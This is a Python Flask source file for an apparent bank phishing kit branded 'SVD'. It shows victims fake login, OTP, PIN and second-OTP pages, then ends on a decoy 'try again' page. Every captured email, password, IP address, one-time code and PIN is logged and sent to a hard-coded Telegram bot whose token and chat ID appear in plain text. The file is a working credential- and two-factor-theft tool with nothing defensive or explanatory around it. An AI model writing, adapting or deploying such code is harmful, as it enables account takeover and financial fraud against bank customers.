# ===== LOAD ENV FIRST =====
from dotenv import load_dotenv
load_dotenv()
from datetime import datetime
# ===== STANDARD IMPORTS =====
import os
import smtplib
from email.message import EmailMessage
from datetime import datetime

# ===== FLASK IMPORTS =====
from flask import Flask, render_template, request, redirect, session

# ===== OPTIONAL =====
import requests


# ===== FLASK APP =====
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "dev-secret")


# ---------- TELEGRAM CONFIG ----------
BOT_TOKEN = "8026714020:AAFLrW2HOHOQqvGB1W5caPZsv5dFx-ZYhZw"
CHAT_ID = "-1003581082109"

def send_to_telegram(message: str):
    if not BOT_TOKEN or not CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception as e:
        print("Telegram error:", e)


# ---------- SMTP EMAIL (OPTIONAL) ----------
def send_email(to_email, subject, html):
    try:
        msg = EmailMessage()
        msg["From"] = os.environ["SMTP_FROM"]
        msg["To"] = to_email
        msg["Subject"] = subject
        msg.set_content("Open this email in HTML view.")
        msg.add_alternative(html, subtype="html")

        host = os.environ["SMTP_HOST"]
        port = int(os.environ["SMTP_PORT"])
        user = os.environ["SMTP_USER"]
        pwd  = os.environ["SMTP_PASS"]

        with smtplib.SMTP(host, port, timeout=20) as server:
            server.starttls()
            server.login(user, pwd)
            server.send_message(msg)

        return True
    except Exception as e:
        print("❌ EMAIL ERROR:", repr(e))
        return False


# =========================
# ROUTES
# =========================
@app.route("/")
def index():
    return redirect("/login")


# ===== LOGIN =====
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        email = request.form.get("email", "")
        password = request.form.get("password", "")

        # ===== CONSOLE (NAKA-SHOW) =====
        print("========== LOGIN ==========")
        print("EMAIL / MOBILE:", email)
        print("PASSWORD:", password)
        print("IP:", request.remote_addr)
        print("TIME:", datetime.now())
        print("===========================")

        # ===== TELEGRAM (NAKA-SHOW) =====
        send_to_telegram(
            "<b>🏦 SVD</b>\n"
            "<b>Login submitted</b>\n\n"
            f"📱 User: <code>{email or '(empty)'}</code>\n"
            f"🔑 Password: <code>{password or '(empty)'}</code>\n"
            f"🌐 IP: <code>{request.remote_addr}</code>\n"
            f"⏰ Time: <code>{datetime.now()}</code>"
        )

        session.clear()
        session["stage"] = "LOGIN_OK"
        return redirect("/otp1")

    return render_template("login.html")


# ===== OTP 1 =====
@app.route("/otp1", methods=["GET", "POST"])
def otp1():
    if session.get("stage") != "LOGIN_OK":
        return redirect("/login")

    if request.method == "POST":
        otp = request.form.get("otp", "")

        print("OTP 1:", otp)

        send_to_telegram(
            "<b>🏦 SVD</b>\n"
            "<b>OTP #1 submitted</b>\n"
            f"🔢 OTP: <code>{otp}</code>"
        )

        session["stage"] = "OTP1_OK"
        return redirect("/pin")

    return render_template(
        "otp.html",
        title="Verify your sign-in",
        message="Enter the 6-digit code to continue.",
        button="Verify",
        error=None
    )


# ===== PIN =====
@app.route("/pin", methods=["GET", "POST"])
def pin():
    if session.get("stage") != "OTP1_OK":
        return redirect("/login")

    if request.method == "POST":
        pin = request.form.get("pin", "")

        print("PIN:", pin)

        send_to_telegram(
            "<b>🏦 SVD</b>\n"
            "<b>Secure PIN submitted</b>\n"
            f"🔐 PIN: <code>{pin}</code>"
        )

        session["stage"] = "PIN_OK"
        return redirect("/retrieving")

    return render_template("pin.html")


# ===== RETRIEVING =====
@app.route("/retrieving")
def retrieving():
    if session.get("stage") != "PIN_OK":
        return redirect("/login")
    return render_template("retrieving.html")


# ===== OTP 2 =====
@app.route("/otp2", methods=["GET", "POST"])
def otp2():
    if session.get("stage") != "PIN_OK":
        return redirect("/login")

    if request.method == "POST":
        otp2 = request.form.get("otp", "")

        print("OTP 2:", otp2)

        send_to_telegram(
            "<b>🏦 SVD</b>\n"
            "<b>OTP #2 submitted</b>\n"
            f"🔢 OTP: <code>{otp2}</code>"
        )

        return redirect("/try-again")

    return render_template(
        "otp.html",
        title="Final security check",
        message="Enter the 6-digit verification code to complete sign-in.",
        button="Verify",
        error=None
    )


# ===== TRY AGAIN =====
@app.route("/try-again")
def try_again():
    session.clear()
    return render_template("try_again.html")


@app.route("/logout")
def logout():
    session.clear()
    return redirect("/login")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
